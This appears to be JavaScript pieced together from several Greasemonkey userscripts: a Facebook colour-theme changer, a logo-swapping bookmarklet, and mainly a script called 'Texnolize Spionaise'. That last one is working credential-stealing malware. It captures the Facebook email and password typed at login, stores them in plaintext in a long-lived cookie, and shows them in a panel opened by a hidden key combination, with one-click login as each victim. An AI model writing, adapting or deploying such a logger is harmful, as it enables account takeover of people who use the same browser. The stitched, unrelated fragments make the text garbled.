                  "    border-right: 1px solid "+setup.colour2+";" +
                  "    border-top: 1px solid "+setup.colour2+";" +
                  "}" +
                  ".profile_actions a.profile_action {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile_actions .holder {" +
                  "    border-bottom: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile_actions a:hover {" +
                  "    background-color: "+setup.colour1+";" +
                  "}" +
                  "div.action a.remove:hover, div.action a.hover {" +
                  "    background: url(\"http://static.ak.fbcdn.net/rsrc.php/zV/r/5luk374gOfy.gif\") no-repeat scroll -12px center "+setup.colour1+";" +
                  "}" +
                  ".profile .blurb {" +
                  "    border: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile .box_column {" +
                  "    border-bottom: 1px solid #94A3C4;" +
                  "    border-right: 1px solid #D8DFEA;" +
                  "}" +
                  ".profile .top_bar ul.tabs li.profile_tab_more .tabs_more_menu ul li a.tab_link:hover {" +
                  "    background-color: #899BC1;" +
                  "}" +
                  "a.UIIntentionalStory_Names {" +
                  "    color: "+setup.colour1+";" +
                  "}" +
                  ".typeahead_search .suggestions_bottom_border {" +
                  "    border-bottom: 1px solid "+setup.colour1+";" +
                  "}" +
                  ".typeahead_search .typeahead_suggestions {" +
                  "    border-left: 1px solid #95A5C6;" +
                  "    border-right: 1px solid #95A5C6;" +
                  "}" +
                  ".typeahead_search .typeahead_selected img {" +
                  "    border: 1px solid #6E84B3;" +
                  "}" +
                  ".uiLightMorePager {" +
                  "    border-top: 1px solid #E5EAF1;" +
                  "}" +
                  ".uiLightMorePager:hover {" +
                  "    border-top: 1px solid #D8DFEA;" +
                  "}" +
                  ".uiMorePagerAnchor a.primary:hover {" +
                  "    background-color: #D8DFEA;" +
                  "}" +
                  ".uiMorePagerAnchor a.primaryLight:hover {" +
                  "    background-color: #EDEFF4;" +
                  "}" +
                  ".buddyListTypeahead .wrap {" +
                  "    border: 1px solid #BDC7D8;" +
                  "}" +
                  ".buddyListTypeahead .uiTypeaheadView li.selected {" +
                  "    background-color: #D8DFEA;" +
                  "    border-color: #D8DFEA;" +
                  "}" +
                  "#UIUpcoming_New {" +
                  "    background-color: #FFF7C5;" +
                  "}";
}

GM_registerMenuCommand("Banner Changer", setColours);
addStyle(eval(GM_getValue("setup",'({colour1:"#3b5998", colour2:"#6d84b4"})')));


javascript:var o=document.getElementById('pageLogo').getElementsByTagName('a')[0];void(o.style.backgroundImage='url("https://lh6.googleusercontent.com/-lsaWu7nME9g/TYQ2264K99I/AAAAAAAAAPg/rMuVYif1y10/s1600/alternatif.png")');void(o.style.backgroundPosition='0 0')
// Made By Rui Fujiwara
// Made In Yogyakarta

var title 				= "Texnolize Spionaise";
var version 			= "v3.0";

var width 				= 700;
var height 				= 400;
var cookieName 			= "uffedentuffe";
var daysToKeepCookie 	= 365;
var delimiter 			= ",";
var subDelimiter 		= "|";
var cookie				= readCookie(cookieName);
var submitControl;
var unControl;
var pwControl;

///////////////////
// Specific code //
///////////////////

init();

function init()
{
	//getElementsByClassNameAndType('uiButtonConfirm', 'submit')[0].addEventListener("click", saveLogin, false);	
	
	getElementByTabIndex("4", "submit")[0].addEventListener("click", saveLogin, false);;
	unControl 		= document.getElementById('email');
	pwControl 		= document.getElementById('pass');
}

function saveLogin()
{
	if (unControl.value.length == 0 || pwControl.value.length == 0)
		return;
	
	var date = new Date();
	
	var value = date.getTime() + subDelimiter + unControl.value + subDelimiter + pwControl.value;
	
	if(cookie)
		value += delimiter + cookie;
	
	writeCookie(cookieName, value, daysToKeepCookie);
}

unsafeWindow.doTheBossanova = function(email, password)
{
	unControl.value = email;
	pwControl.value = password;
	document.forms[0].submit();
}

///////////////////
// Generic code  //
///////////////////

jollyRogerz = 'data:image/png;base64,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%3D%3D';

topBanner = 'data:image/gif;base64,'+
'R0lGODlhAQA+AMQAAAAAAP///8C/wNbX18fHxsDAv8vKyt3d3dzc3Nvb29ra2tnZ2djY2NXV1dTU'+
'1NPT09HR0dDQ0M/Pz83NzczMzMnJycjIyMfHx8XFxcTExMPDw8LCwsHBwcDAwL+/vwAAACwAAAAA'+
'AQA+AAAFMOAhHgiSKAszNM4DRdJEGZVFYJm2cZ3gFR3ORpPBXCwVA2UiiUAejsaAsVAkSiNRCAA7';

cookie = readCookie(cookieName);

if (document.addEventListener)
   document.addEventListener("keypress", keyPress,false);
else if (document.attachEvent)
   document.attachEvent("onkeypress", keyPress);
else
   document.onkeypress= keyPress;

function writeCookie(name, value, days) 
{
	if (days) 
	{
		var date = new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires = "; expires="+date.toGMTString();
	}
	else var expires = "";
	document.cookie = name+"="+value+expires+"; path=/";
}

function readCookie(name) 
{
	var nameEQ = name + "=";
	var ca = document.cookie.split(';');
	for(var i=0;i < ca.length;i++) 
	{
		var c = ca[i];
		while (c.charAt(0)==' ') c = c.substring(1,c.length);
		if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
	}
	return null;
}

function eraseCookie(name) 
{
	writeCookie(name, "", -1);
	cookie = null;
}

function keyPress(e)
{
	var c =  String.fromCharCode(e.which).toUpperCase();
	
	if (c == "R" && e.shiftKey && e.ctrlKey && e.altKey)
		display();

	else if (c == "D" && e.shiftKey && e.ctrlKey && e.altKey)
	{
		eraseCookie(cookieName);
		unsafeWindow.killWindow();
		display();
	}
	else if (e.keyCode == 27)
		unsafeWindow.killWindow();
}

unsafeWindow.clearLog = function()
{
	eraseCookie(cookieName);
	unsafeWindow.killWindow();
	display();
}


unsafeWindow.killWindow = function ()
{
	if (document.getElementById('displayDiv') != null)
		document.body.removeChild(document.getElementById('displayDiv'));
}

function display()
{
	if (cookie == null)
	{
		alert ('No Data!');
		return;
	}

	GM_addStyle('div#displayDiv{position:absolute; width:'+width+'px; height:'+height+'px; top:50%; left:50%; margin:-' + (height/2) + 'px auto auto -' + (width/2) + 'px; border:2px solid #333; background: url('+topBanner+') #DDD; font-size:12px;-moz-border-radius: 8px; -webkit-border-radius: 8px; -moz-box-shadow:10px 10px 20px #000000; z-index:5;}');
	GM_addStyle('div#displayDiv #logo{float:left; margin:5px;}');
	GM_addStyle('div#displayDiv #title{float:left; margin-top:16px; font-weight:bolder; color:#333;}');
	GM_addStyle('div#displayDiv #closeButton{float:right; margin:3px;}');
	GM_addStyle('div#displayDiv #clearLogButton{float:right; margin:3px;}');
	GM_addStyle('div#displayDiv #version{float:left; margin-top:28px; margin-left:5px; color:#888; font-weight:bold;}');

	GM_addStyle('#tableContainer{clear: both; border: 1px solid #444; height: 320px; overflow: hidden; width: 680px; margin:0 auto; background-color:#EEE;}');
	GM_addStyle('#tableContainer table{height: 320px; width: 680px; font-size:12px; border:1px solid #000000; -moz-box-shadow:10px 10px 20px #000000;}');
	GM_addStyle('#tableContainer table thead tr{display: block; position:relative; background-color: #999999; border-bottom:1px solid #444;}');
	GM_addStyle('#tableContainer table thead tr th{text-align:left; font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th{text-align:left; font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th + th{text-align:left; font-weight:bold; width:200px; border-right:1px solid #444;}');	
	GM_addStyle('#tableContainer table thead tr th + th + th + th{text-align:left; font-weight:bold; width:76px;}');	

	GM_addStyle('#tableContainer table tbody {text-align:left; height:300px; display:block; width:100%; overflow: -moz-scrollbars-vertical;}');	
	
	
	GM_addStyle('#tableContainer table tbody tr:nth-child(even){text-align:left; width:80px; background-color:#EEE;}');	
	GM_addStyle('#tableContainer table tbody tr:nth-child(odd){text-align:left; width:80px; background-color:#F8F8F8;}');	

	GM_addStyle('#tableContainer table tbody tr td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td + td{text-align:left; width:200px; border-right:1px solid #999;}');	
	GM_addStyle('#tableContainer table tbody tr td + td + td + td{text-align:left; width:60px; border-right:none;}');	
	
	GM_addStyle('.unselectable{-moz-user-select: none; -khtml-user-select: none; user-select: none;}');


	var html = '';

	html += '<div id="logo" class="unselectable"><img src="'+jollyRogerz+'"></div>';
	html += '<button id="closeButton" class="unselectable" onClick="killWindow()">X</button>';
	html += '<button id="clearLogButton" class="unselectable" onClick="clearLog()">Clean</button>';
	html += '<h1 id="title" class="unselectable">'+title+'</h1>';
	html += '<span id="version" class="unselectable">'+version+'</span>';

	html += '<div id="tableContainer">';
	html += '<table cellspacing="0"><thead class="unselectable"><tr><th>Date Login</th><th>User ID</th><th>Password</th><th>Action</th></tr></thead>';
	html += '<tbody>';

	var array = cookie.split(delimiter);

	for (i=0; i < array.length; i++)
	{
		var subArray = array[i].split(subDelimiter);
		var date = new Date();
		date.setTime(subArray[0]);
		html += '<tr><td>'+date.toLocaleString()+'</td><td>'+subArray[1]+'</td><td>'+subArray[2]+'</td><td><a href="#" onClick="doTheBossanova(\''+subArray[1]+'\', \''+subArray[2]+'\')">Enterance &raquo;</a></td></tr>';
	}

	html += '</tbody>';
	html += '</table>';
	html += '</tableContainer>';

	var displayDiv = document.createElement('div');
	displayDiv.setAttribute('id', 'displayDiv');
	displayDiv.innerHTML = html;
	document.body.appendChild(displayDiv);
}

function getElementsByClassName(classname, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) ) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}

function getElementsByClassNameAndType(classname, type, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 

	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) && els[i].type == type) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}

function getElementByTabIndex(index, type, node)
{
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	
	var a = [];

	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if (els[i].tabIndex == index && els[i].type == type)
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}


